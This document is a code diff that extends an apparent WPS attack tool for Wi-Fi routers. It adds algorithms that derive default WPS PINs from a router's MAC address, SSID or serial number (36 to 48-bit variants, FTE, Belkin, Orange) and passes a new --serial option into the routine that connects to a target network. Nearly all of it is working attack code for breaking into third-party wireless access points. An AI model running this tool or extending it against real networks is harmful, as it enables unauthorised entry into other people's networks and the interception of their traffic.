@@ -116,6 +116,10 @@ class WPSpin:
         self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                       'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                       'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
+                      'pin36': {'name': '36-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin36},
+                      'pin40': {'name': '40-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin40},
+                      'pin44': {'name': '44-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin44},
+                      'pin48': {'name': '48-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin48},
                       'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                       'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                       'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
@@ -123,6 +127,10 @@ class WPSpin:
                       'pinEasybox': {'name': 'EasyBox', 'mode': self.ALGO_MAC, 'gen': self.pinEasybox},
                       'pinArris': {'name': 'Arris', 'mode': self.ALGO_MAC, 'gen': self.pinArris},
                       'pinTrendNet': {'name': 'TrendNet', 'mode': self.ALGO_MAC, 'gen': self.pinTrendNet},
+                      # Algorithms needing extra input (handled specially in generate())
+                      'pinFTE': {'name': 'FTE', 'mode': self.ALGO_MAC, 'gen': None, 'needs': 'ssid'},
+                      'pinBelkin': {'name': 'Belkin', 'mode': self.ALGO_MAC, 'gen': None, 'needs': 'serial'},
+                      'pinOrange': {'name': 'Orange', 'mode': self.ALGO_MAC, 'gen': None, 'needs': 'serial'},
                       # Static pin algos
                       'pinGeneric': {'name': 'Static', 'mode': self.ALGO_STATIC_DB,
                                      'gen': lambda mac: 1234567, 'static': []},
@@ -145,15 +153,24 @@ class WPSpin:
             pin = int(pin / 10)
         return (10 - accum % 10) % 10
 
-    def generate(self, algo, mac):
+    def generate(self, algo, mac, ssid=None, serial=None):
         """
         WPS pin generator
         @algo — the WPS pin algorithm ID
+        @ssid — network name (required by 'pinFTE')
+        @serial — device serial (required by 'pinBelkin'/'pinOrange')
         Returns the WPS pin string value
         """
         mac = NetworkAddress(mac)
         if algo not in self.algos:
             raise ValueError('Invalid WPS pin algorithm')
+        # Algorithms that need more than the MAC are handled here.
+        if algo == 'pinFTE':
+            return self.pinFTE(mac, ssid)
+        if algo == 'pinBelkin':
+            return self.pinBelkin(mac, serial)
+        if algo == 'pinOrange':
+            return self.pinOrange(mac, serial)
         pin = self.algos[algo]['gen'](mac)
         new_algos = {'pinEmpty', 'pinEasybox', 'pinArris', 'pinTrendNet'}
         if algo in new_algos:
@@ -162,7 +179,16 @@ class WPSpin:
         pin = str(pin) + str(self.checksum(pin))
         return pin.zfill(8)
 
-    def getSuggested(self, mac):
+    def _needs_met(self, algo, ssid, serial):
+        """Whether an algorithm's extra input (SSID/serial) is available."""
+        needs = self.algos[algo].get('needs')
+        if needs == 'ssid':
+            return bool(ssid) and len(ssid) >= 2
+        if needs == 'serial':
+            return bool(serial) and len(serial) >= 4
+        return True
+
+    def getSuggested(self, mac, ssid=None, serial=None):
         """
         Get all suggested WPS pin's for single MAC
         """
@@ -170,6 +196,8 @@ class WPSpin:
         res = []
         for ID in algos:
             algo = self.algos[ID]
+            if not self._needs_met(ID, ssid, serial):
+                continue
             item = {}
             item['id'] = ID
             if algo['mode'] == self.ALGO_STATIC_DB:
@@ -179,19 +207,21 @@ class WPSpin:
                         res.append(new_item)
             else:
                 item['name'] = algo['name']
-                item['pin'] = self.generate(ID, mac)
+                item['pin'] = self.generate(ID, mac, ssid=ssid, serial=serial)
                 res.append(item)
         self.algos['pinGeneric']['static'].clear()
         return res
 
-    def getSuggestedList(self, mac):
+    def getSuggestedList(self, mac, ssid=None, serial=None):
         """
         Get all suggested WPS pin's for single MAC as list
         """
         algos = self._suggest(mac)
         res = []
         for algo in algos:
-            res.append(self.generate(algo, mac))
+            if not self._needs_met(algo, ssid, serial):
+                continue
+            res.append(self.generate(algo, mac, ssid=ssid, serial=serial))
         return res
 
     def getLikely(self, mac):
@@ -308,6 +338,18 @@ class WPSpin:
     def pin32(self, mac):
         return mac.integer % 0x100000000
 
+    def pin36(self, mac):
+        return mac.integer & 0xFFFFFFFFF
+
+    def pin40(self, mac):
+        return mac.integer & 0xFFFFFFFFFF
+
+    def pin44(self, mac):
+        return mac.integer & 0xFFFFFFFFFFF
+
+    def pin48(self, mac):
+        return mac.integer & 0xFFFFFFFFFFFF
+
     def pinDLink(self, mac):
         # Get the NIC part
         nic = mac.integer & 0xFFFFFF
@@ -344,6 +386,94 @@ class WPSpin:
                + (((b[1] + b[2]) % 10) * 100000)
                + (((b[0] + b[1]) % 10) * 1000000))
         return pin
+
+    @staticmethod
+    def _hex_digit(ch):
+        """Parse a single hex char, 0 on failure (matches the reference impl)."""
+        try:
+            return int(ch, 16)
+        except ValueError:
+            return 0
+
+    def _with_checksum(self, pin):
+        """7-digit PIN + WPS checksum as an 8-char string."""
+        pin %= 10000000
+        return '{:07d}{}'.format(pin, self.checksum(pin))
+
+    def pinFTE(self, mac, ssid):
+        """FTE/Jazztel: PIN from a MAC byte + the last two SSID characters (hex)."""
+        if not ssid or len(ssid) < 2:
+            return ''
+        machex = mac.string.replace(':', '')
+        try:
+            val = int(machex[6:8] + ssid[-2:], 16)
+        except ValueError:
+            val = 1234567
+        return self._with_checksum((val % 10000000) + 7)
+
+    def pinBelkin(self, mac, serial):
+        """Belkin: PIN derived from the device serial and the MAC."""
+        if not serial or len(serial) < 4:
+            return ''
+        machex = mac.string.replace(':', '')
+        s = [self._hex_digit(serial[-4 + i]) for i in range(4)]
+        n = [self._hex_digit(machex[-4 + i]) for i in range(4)]
+        k1 = (s[2] + s[3] + n[0] + n[1]) % 16
+        k2 = (s[0] + s[1] + n[3] + n[2]) % 16
+        pin = k1 ^ s[1]
+        t1 = k1 ^ s[0]
+        t2 = k2 ^ n[1]
+        p1 = n[0] ^ s[1] ^ t1
+        p2 = k2 ^ n[0] ^ t2
+        p3 = k1 ^ s[2] ^ k2 ^ n[2]
+        k1 ^= k2
+        pin = (pin ^ k1) * 16
+        pin = (pin ^ t1) * 16
+        pin = (pin ^ p1) * 16
+        pin = (pin ^ t2) * 16
+        pin = (pin ^ p2) * 16
+        pin = (pin ^ k1) * 16
+        pin += p3
+        return self._with_checksum(pin)   # reference's correction term is always 0 here
+
+    @staticmethod
+    def _last_two_bytes_wan(mac):
+        """WAN-side last two bytes used by the Orange algorithm."""
+        machex = mac.string.replace(':', '')
+        if len(machex) < 12:
+            return '0000'
+        wimac = machex[8:12]
+        if wimac == '0000':
+            return 'fffe'
+        if wimac == '0001':
+            return 'ffff'
+        last = int(wimac[3], 16) - 2
+        return wimac[:3] + format(last & 0xFFFFFFFF, 'x')
+
+    def pinOrange(self, mac, serial):
+        """Orange: PIN derived from the device serial and a WAN-adjusted MAC."""
+        if not serial or len(serial) < 4:
+            return ''
+        serial = serial[-4:]
+        wan = self._last_two_bytes_wan(mac)
+        shex = [self._hex_digit(serial[i]) for i in range(4)]
+        wanhex = [self._hex_digit(wan[i]) for i in range(4)]
+        k1s = format(shex[0] + shex[1] + wanhex[2] + wanhex[3], 'x')
+        k2s = format(shex[2] + shex[3] + wanhex[0] + wanhex[1], 'x')
+        k1 = self._hex_digit(k1s if len(k1s) < 2 else k1s[1])
+        k2 = self._hex_digit(k2s if len(k2s) < 2 else k2s[1])
+        parts = [format(shex[3] ^ k1, 'x'), format(shex[2] ^ k1, 'x'),
+                 format(wanhex[1] ^ k2, 'x'), format(wanhex[2] ^ k2, 'x'),
+                 format(shex[3] ^ wanhex[2], 'x'), format(shex[2] ^ wanhex[3], 'x'),
+                 format(shex[1] ^ k1, 'x')]
+        try:
+            pin = int(''.join(parts), 16)
+        except ValueError:
+            pin = 1234567
+        prepin = str(pin)
+        if len(prepin) > 7:
+            prepin = prepin[-7:]
+        return self._with_checksum(int(prepin))
 
 
 def get_hex(line):
@@ -669,8 +799,8 @@ class Companion:
             file.write(pin)
         print('[i] PIN saved in {}'.format(filename))
 
-    def __prompt_wpspin(self, bssid):
-        pins = self.generator.getSuggested(bssid)
+    def __prompt_wpspin(self, bssid, ssid=None, serial=None):
+        pins = self.generator.getSuggested(bssid, ssid=ssid, serial=serial)
         if len(pins) > 1:
             print(f'PINs generated for {bssid}:')
             print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
@@ -735,7 +865,7 @@ class Companion:
         return False
 
     def single_connection(self, bssid=None, ssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
-                          pixieforce=False, store_pin_on_fail=False):
+                          pixieforce=False, store_pin_on_fail=False, serial=None):
         if not pin:
             if pixiemode:
                 try:
@@ -751,7 +881,7 @@ class Companion:
                     pin = '12345670'
             elif not pbc_mode:
                 # If not pixiemode, ask user to select a pin from the list
-                pin = self.__prompt_wpspin(bssid) or '12345670'
+                pin = self.__prompt_wpspin(bssid, ssid, serial) or '12345670'
         if pbc_mode:
             self.__wps_connection(bssid, pbc_mode=pbc_mode)
             bssid = self.connection_status.bssid
@@ -1270,6 +1400,11 @@ if __name__ == '__main__':
              "'nl80211' (built-in netlink, no iw binary), or 'iw' (legacy)"
         )
     parser.add_argument(
+        '--serial',
+        type=str,
+        help='Device serial number — enables the Belkin and Orange PIN algorithms'
+        )
+    parser.add_argument(
         '--mtk-wifi',
         action='store_true',
         help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
@@ -1328,7 +1463,7 @@ if __name__ == '__main__':
                     else:
                         companion.single_connection(bssid=args.bssid, ssid=args.ssid, pin=args.pin,
                                                     pixiemode=args.pixie_dust, showpixiecmd=args.show_pixie_cmd,
-                                                    pixieforce=args.pixie_force)
+                                                    pixieforce=args.pixie_force, serial=args.serial)
             if not args.loop:
                 break
             else:
